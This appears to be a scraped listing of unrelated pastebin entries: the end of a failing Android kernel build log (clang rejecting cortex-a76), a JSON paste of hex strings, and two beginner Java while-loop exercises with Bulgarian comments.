  GEN     ./Makefile
  CHK     include/generated/uapi/linux/version.h
  CHK     include/generated/utsrelease.h
  Using .. as source for kernel
  LDS     scripts/module-lto.lds
  HOSTCC  scripts/kallsyms
  HOSTCC  scripts/sortextable
  HOSTCC  scripts/asn1_compiler
  CC      scripts/mod/empty.o
  HOSTCC  scripts/mod/mk_elfconfig
  CC      scripts/mod/devicetable-offsets.s
  HOSTCC  scripts/dtc/dtc.o
  HOSTCC  scripts/dtc/flattree.o
  HOSTCC  scripts/dtc/fstree.o
  HOSTCC  scripts/selinux/mdp/mdp
  HOSTCC  scripts/selinux/genheaders/genheaders
  CHK     scripts/mod/devicetable-offsets.h
Assembler messages:
Error: unknown cpu `cortex-a76'
Error: unrecognized option -mcpu=cortex-a76
clang-17: error: assembler command failed with exit code 1 (use -v to see invocation)
make[3]: *** [../scripts/Makefile.build:365: scripts/mod/empty.o] Error 1
make[3]: *** Ожидание завершения заданий…
  HOSTCC  scripts/dtc/data.o
  HOSTCC  scripts/dtc/livetree.o
  HOSTCC  scripts/dtc/treesource.o
  HOSTCC  scripts/dtc/srcpos.o
  HOSTCC  scripts/dtc/checks.o
  HOSTCC  scripts/dtc/util.o
  HOSTCC  scripts/dtc/dtc-lexer.lex.o
  HOSTCC  scripts/dtc/dtc-parser.tab.o
make[2]: *** [../scripts/Makefile.build:678: scripts/mod] Error 2
make[2]: *** Ожидание завершения заданий…
  HOSTLD  scripts/dtc/dtc
make[1]: *** [/home/yaroslav/Документы/vayu-kernel/Makefile:630: scripts] Error 2
make[1]: выход из каталога «/home/yaroslav/Документы/vayu-kernel/out»
make: *** [Makefile:153: sub-make] Error 2"
yM8y9WR2,data586,TestGuy1,JSON,Sunday 28th of May 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '68b0df806dac9256174ceeff762c06aa0e5f98e9179d8dcf0ee170e2f2f993e704e15ed2509b82aa5d5985920a0343e0c4d3dc052078138bb1c2e8f77d926adb32bc2e53820fd42ec63004073c665cecf84a0725a39a8c274dcb128ab0bfb7b16f812170565b7b33c3fa3eca98521ea593a20463391b8bbe2ebeda562a66d6df',
  otherdata: [
    'cab4196f93a1d8a1febf2cfa7d9c0d47',
    'ead5c551e473dfa6dc590c90fa993778',
    '4f7a6e97a633672619b759c21385b90d',
    '98bb535db8636dae23100a70b802c2f0',
    'f0cb32674a27b2f56434383da43946da',
    'c7803587345ff06c0b63e061fa18ccaa',
    'f3524415b829acb3834fa6f1382c142b',
    '949234af8c32df7ce04a706eb170b7ca'
  ]
}"
kKqFrbRY,07. Moving,myrdok123,Java,Sunday 28th of May 2023 05:30:14 AM CDT,"package L05_WhileLoop;

import java.util.Scanner;

public class P07_Moving {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);


        int width = Integer.parseInt(scanner.nextLine());
        int length = Integer.parseInt(scanner.nextLine());
        int height = Integer.parseInt(scanner.nextLine());

        //изчисляваме колко ни е свободното пространство -> width * length * height

        int availableSpace = width * length * height;

        //На следващите редове (до получаване на команда ""Done"") - брой кашони, които се пренасят
        String command = scanner.nextLine();

        //правим цикъл докато не получим команда ""Done"" или свободното простраство стане <= 0

        while (!command.equals(""Done"")){

            //парсваме/преобразуваме command към цяло число -> текущият брой кашони

            int currentBoxes = Integer.parseInt(command);

            //изчисляваме колко свободно простраство ни е останало
            availableSpace -= currentBoxes;

            // проверяваме дали имаме свободно пространство
            if(availableSpace <= 0){

                System.out.printf(""No more free space! You need %d Cubic meters more."", Math.abs(availableSpace));
                break;
            }

            //прочитаме от конзолата команда -> Done или брой кашони
            command = scanner.nextLine();
        }



        //проверяваме дали имаме свободно пространство
        if (availableSpace > 0){
            System.out.printf(""%d Cubic meters left."", availableSpace);
        }


    }
}
"
vdcvRLfG,06. Cake,myrdok123,Java,Sunday 28th of May 2023 05:29:17 AM CDT,"package L05_WhileLoop;

import java.util.Scanner;

public class P06_Cake {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);


        int width = Integer.parseInt(scanner.nextLine());
        int length = Integer.parseInt(scanner.nextLine());
        String command = scanner.nextLine();

        //намираме броя парчета на тортата
        int countPieces = width * length;

        //while -> докато не получим команда стоп или докато не свършат парчетата -> гост взема n парчета
        while (!command.equals(""STOP"")){

            //преобразуваме/парсваме командата към int -> получаваме броя парчета, които гостите вземат
            int currentPieces = Integer.parseInt(command);

            //изчисляваме колко парчета са останали след като някой си е взел торта
            countPieces -= currentPieces;

            //проверяваме дали имаме останала торта
            if(countPieces <= 0){
                //ако стигнем тук -> нямаме повече торта
                //принтираме
                System.out.printf(""No more cake left! You need %d pieces more."", Math.abs(countPieces));
                break;
            }

            //прочитаме от конзолата команда -> STOP или брой парчета

            command = scanner.nextLine();

        }

        //правим проверка дали имаме останали парчета торта

        if(countPieces > 0){
            System.out.printf(""%d pieces are left."", countPieces );
        }


    }
}
"
